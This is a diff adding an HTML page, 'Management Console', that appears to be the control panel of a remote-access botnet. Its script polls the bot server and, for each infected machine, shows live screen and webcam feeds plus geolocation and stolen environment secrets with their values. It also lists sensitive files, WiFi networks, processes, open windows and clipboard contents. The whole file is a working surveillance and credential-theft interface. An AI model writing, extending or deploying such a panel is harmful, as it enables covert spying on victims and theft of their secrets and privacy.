@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <title>Management Console</title>
+    <style>
+        *, *::before, *::after { box-sizing: border-box; }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Arial, sans-serif;
+            background: #f0f2f5;
+            color: #1a1a2e;
+            margin: 0;
+            display: flex;
+            flex-direction: column;
+            height: 100vh;
+            overflow: hidden;
+        }
+
+        /* Top Nav */
+        nav {
+            background: #fff;
+            border-bottom: 1px solid #e0e0e0;
+            padding: 0 1.5rem;
+            height: 52px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-shrink: 0;
+        }
+        .nav-title { font-weight: 700; font-size: 1rem; color: #1a1a2e; }
+        .nav-badge {
+            background: #e7f5ee;
+            color: #2d7a50;
+            padding: 3px 10px;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            font-weight: 600;
+        }
+
+        /* Layout */
+        .layout {
+            display: flex;
+            flex: 1;
+            overflow: hidden;
+        }
+
+        /* Sidebar */
+        aside {
+            width: 260px;
+            background: #fff;
+            border-right: 1px solid #e0e0e0;
+            display: flex;
+            flex-direction: column;
+            flex-shrink: 0;
+        }
+
+        .aside-header {
+            padding: 1rem 1.25rem 0.5rem;
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: #888;
+        }
+
+        .node-list { overflow-y: auto; padding: 0.5rem; }
+
+        .node-item {
+            padding: 0.75rem 1rem;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: background 0.15s;
+            margin-bottom: 2px;
+        }
+        .node-item:hover { background: #f5f5f5; }
+        .node-item.active { background: #eef4ff; }
+
+        .node-name {
+            font-weight: 600;
+            font-size: 0.85rem;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        .dot {
+            width: 7px; height: 7px;
+            border-radius: 50%;
+            background: #34c759;
+            flex-shrink: 0;
+        }
+        .node-sub { font-size: 0.72rem; color: #888; margin-top: 2px; }
+
+        /* Main */
+        main {
+            flex: 1;
+            overflow-y: auto;
+            padding: 1.5rem;
+        }
+
+        .empty-state {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            color: #bbb;
+            gap: 0.5rem;
+        }
+
+        /* Section headers */
+        .section-label {
+            font-size: 0.7rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            color: #888;
+            margin-bottom: 0.75rem;
+        }
+
+        /* Cards */
+        .cards-row {
+            display: grid;
+            gap: 1rem;
+            margin-bottom: 1.25rem;
+        }
+        .col-2 { grid-template-columns: 1fr 1fr; }
+        .col-3 { grid-template-columns: 1fr 1fr 1fr; }
+        .col-4 { grid-template-columns: 1fr 1fr 1fr 1fr; }
+
+        .card {
+            background: #fff;
+            border: 1px solid #e8e8e8;
+            border-radius: 10px;
+            overflow: hidden;
+        }
+
+        .card-head {
+            padding: 0.75rem 1rem;
+            border-bottom: 1px solid #f0f0f0;
+            font-weight: 600;
+            font-size: 0.82rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .card-body { padding: 1rem; }
+
+        /* Media */
+        .media-box {
+            width: 100%;
+            aspect-ratio: 16/9;
+            background: #111;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #555;
+            font-size: 0.8rem;
+        }
+        .media-box img { width: 100%; height: 100%; object-fit: contain; }
+
+        /* KV rows */
+        .kv { display: flex; justify-content: space-between; font-size: 0.82rem; padding: 0.35rem 0; border-bottom: 1px solid #fafafa; }
+        .kv:last-child { border: none; }
+        .kv-label { color: #888; }
+        .kv-val { font-weight: 500; text-align: right; max-width: 60%; word-break: break-all; }
+
+        /* Tags */
+        .tag-list { display: flex; flex-wrap: wrap; gap: 0.3rem; }
+        .tag {
+            padding: 2px 8px;
+            border-radius: 4px;
+            font-size: 0.72rem;
+            font-weight: 500;
+        }
+        .tag-red { background: #fdecea; color: #b71c1c; }
+        .tag-blue { background: #e8f0fe; color: #1a73e8; }
+        .tag-gray { background: #f1f3f4; color: #555; }
+        .tag-green { background: #e6f4ea; color: #1e7e34; }
+
+        /* Scrollable list */
+        .scroll-list {
+            max-height: 160px;
+            overflow-y: auto;
+            font-size: 0.78rem;
+        }
+        .list-row {
+            padding: 0.25rem 0;
+            border-bottom: 1px solid #fafafa;
+            color: #444;
+        }
+
+        /* Status pill */
+        .pill {
+            padding: 2px 8px;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            font-weight: 600;
+        }
+        .pill-green { background: #e6f4ea; color: #1e7e34; }
+
+        /* Text area style for clipboard */
+        .clipboard-box {
+            background: #f8f9fa;
+            border: 1px solid #e8e8e8;
+            border-radius: 6px;
+            padding: 0.6rem;
+            font-size: 0.78rem;
+            word-break: break-all;
+            color: #333;
+            min-height: 40px;
+            max-height: 100px;
+            overflow-y: auto;
+        }
+    </style>
+</head>
+<body>
+
+<nav>
+    <span class="nav-title">Management Console</span>
+    <span class="nav-badge" id="badge">0 Nodes Active</span>
+</nav>
+
+<div class="layout">
+    <aside>
+        <div class="aside-header">Connected Nodes</div>
+        <div class="node-list" id="node-list"></div>
+    </aside>
+
+    <main id="main">
+        <div class="empty-state">
+            <div style="font-size:2rem">🖥️</div>
+            <div>Select a node to view details</div>
+        </div>
+    </main>
+</div>
+
+<script>
+let bots = {};
+let selected = null;
+
+async function poll() {
+    try {
+        const res = await fetch('/api/bots');
+        const data = await res.json();
+        bots = data.bots;
+        document.getElementById('badge').textContent = `${Object.keys(bots).length} Nodes Active`;
+        renderSidebar();
+        if (selected && bots[selected]) renderDashboard();
+    } catch(e) {}
+}
+
+function renderSidebar() {
+    document.getElementById('node-list').innerHTML = Object.keys(bots).map(id => `
+        <div class="node-item ${selected === id ? 'active' : ''}" onclick="selectNode('${id}')">
+            <div class="node-name"><span class="dot"></span>${id}</div>
+            <div class="node-sub">Last seen: ${bots[id].last_seen}</div>
+        </div>
+    `).join('');
+}
+
+function selectNode(id) {
+    selected = id;
+    renderSidebar();
+    renderDashboard();
+}
+
+function tags(arr, cls='tag-gray') {
+    if (!arr || !arr.length) return '<span style="color:#ccc;font-size:0.75rem">None detected</span>';
+    return `<div class="tag-list">${arr.map(x => `<span class="tag ${cls}">${x}</span>`).join('')}</div>`;
+}
+
+function kvRow(label, value) {
+    return `<div class="kv"><span class="kv-label">${label}</span><span class="kv-val">${value ?? 'N/A'}</span></div>`;
+}
+
+function listRows(arr) {
+    if (!arr || !arr.length) return '<div style="color:#ccc;font-size:0.75rem">None</div>';
+    return `<div class="scroll-list">${arr.map(r => `<div class="list-row">${typeof r === 'object' ? (r.name || JSON.stringify(r)) : r}</div>`).join('')}</div>`;
+}
+
+function renderDashboard() {
+    const bot = bots[selected];
+    const info = bot.info || {};
+    const geo = info.geolocation || {};
+    const sys = info.system_info || {};
+
+    const screenSrc = bot.screenshots && bot.screenshots.length
+        ? `data:image/png;base64,${bot.screenshots[bot.screenshots.length-1].data}` : '';
+    const camSrc = bot.cam_frames && bot.cam_frames.length
+        ? `data:image/jpeg;base64,${bot.cam_frames[bot.cam_frames.length-1].data}` : '';
+
+    const screenTime = bot.screenshots && bot.screenshots.length ? bot.screenshots[bot.screenshots.length-1].time : '—';
+    const camTime = bot.cam_frames && bot.cam_frames.length ? bot.cam_frames[bot.cam_frames.length-1].time : '—';
+
+    // Si ya existe el dashboard para este bot, solo actualiza las partes dinámicas
+    const currBotEl = document.getElementById('current-bot-id');
+    if (currBotEl && currBotEl.dataset.botId === selected) {
+        
+        const clipEl = document.getElementById('clipboard-box');
+        if (clipEl) clipEl.textContent = info.clipboard_content || '[empty]';
+
+        const screenTimeEl = document.getElementById('screen-time');
+        if (screenTimeEl) screenTimeEl.textContent = screenTime;
+        const camTimeEl = document.getElementById('cam-time');
+        if (camTimeEl) camTimeEl.textContent = camTime;
+        return;
+    }
+
+    document.getElementById('main').innerHTML = `
+        <div id="current-bot-id" data-bot-id="${selected}" style="display:none;"></div>
+
+
+        <!-- Live Feeds -->
+        <div class="section-label">Live Monitoring</div>
+        <div class="cards-row col-2" style="margin-bottom:1.5rem">
+            <div class="card">
+                <div class="card-head">
+                    Screen Feed
+                    <span class="pill pill-green">● LIVE</span>
+                </div>
+                <div class="media-box">
+                    <img src="/stream/${selected}/screen" id="screen-img">
+                </div>
+                <div class="card-body" style="padding:0.5rem 1rem;font-size:0.7rem;color:#888;">
+                    Stream &nbsp;|&nbsp; Last update: <span id="screen-time">${screenTime}</span>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-head">
+                    Camera Feed
+                    <span class="pill pill-green">● LIVE</span>
+                </div>
+                <div class="media-box">
+                    <img src="/stream/${selected}/cam" id="cam-img" onerror="this.style.display='none'; this.nextSibling.textContent='No camera detected'">
+                </div>
+                <div class="card-body" style="padding:0.5rem 1rem;font-size:0.7rem;color:#888;">
+                    Stream &nbsp;|&nbsp; Last update: <span id="cam-time">${camTime}</span>
+                </div>
+            </div>
+        </div>
+
+        <!-- System + Network -->
+        <div class="section-label">System & Network</div>
+        <div class="cards-row col-4" style="margin-bottom:1.5rem">
+            <div class="card">
+                <div class="card-head">Identity</div>
+                <div class="card-body">
+                    ${kvRow('User', info.user)}
+                    ${kvRow('Hostname', info.hostname)}
+                    ${kvRow('OS', `${sys.platform} ${sys.release}`)}
+                    ${kvRow('Arch', sys.architecture)}
+                    ${kvRow('CPU cores', sys.cpu_count)}
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-head">Geolocation</div>
+                <div class="card-body">
+                    ${kvRow('Public IP', info.public_ip)}
+                    ${kvRow('City', geo.city)}
+                    ${kvRow('Country', geo.country)}
+                    ${kvRow('ISP', geo.isp)}
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-head">Network</div>
+                <div class="card-body">
+                    ${kvRow('Internal IP', info.network_config ? Object.values(info.network_config)[0] : 'N/A')}
+                    ${kvRow('Python', info.python_version)}
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-head">Open Ports</div>
+                <div class="card-body">
+                    ${tags(info.local_open_ports?.map(String), 'tag-blue')}
+                </div>
+            </div>
+        </div>
+
+        <!-- Security -->
+        <div class="section-label">Security Exposure</div>
+        <div class="cards-row col-3" style="margin-bottom:1.5rem">
+            <div class="card">
+                <div class="card-head">Sensitive Files</div>
+                <div class="card-body">
+                    ${tags(info.sensitive_files_found, 'tag-red')}
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-head">Env Secrets (${Object.keys(info.env_secrets_detected || {}).length} found)</div>
+                <div class="card-body">
+                    ${Object.keys(info.env_secrets_detected || {}).length
+                        ? Object.entries(info.env_secrets_detected).map(([k,v]) => `<div class="kv"><span class="kv-label">${k}</span><span class="kv-val">${v}</span></div>`).join('')
+                        : '<span style="color:#ccc;font-size:0.75rem">No secrets found</span>'}
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-head">WiFi SSIDs</div>
+                <div class="card-body">
+                    ${tags(info.wifi_ssids, 'tag-green')}
+                </div>
+            </div>
+        </div>
+
+        <!-- Activity -->
+        <div class="section-label">Activity & Runtime</div>
+        <div class="cards-row col-4" style="margin-bottom:1.5rem">
+            <div class="card">
+                <div class="card-head">Running Processes (top 20)</div>
+                <div class="card-body">
+                    ${listRows(info.running_processes)}
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-head">Active Services</div>
+                <div class="card-body">
+                    ${listRows(info.running_services)}
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-head">Active Windows</div>
+                <div class="card-body">
+                    ${listRows(info.active_windows)}
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-head">Logged-in Users</div>
+                <div class="card-body">
+                    ${listRows(info.running_users)}
+                </div>
+            </div>
+        </div>
+
+        <!-- Clipboard + Modules -->
+        <div class="section-label">Clipboard & Python</div>
+        <div class="cards-row col-2">
+            <div class="card">
+                <div class="card-head">Clipboard Content</div>
+                <div class="card-body">
+                    <div id="clipboard-box" class="clipboard-box">${info.clipboard_content || '[empty]'}</div>
+                </div>
+            </div>
+            <div class="card">
+                <div class="card-head">Python Modules Loaded</div>
+                <div class="card-body">
+                    ${tags(info.python_modules_loaded, 'tag-gray')}
+                </div>
+            </div>
+        </div>
+    `;
+}
+
+setInterval(poll, 2000);
+poll();
+</script>
+
+</body>
+</html>
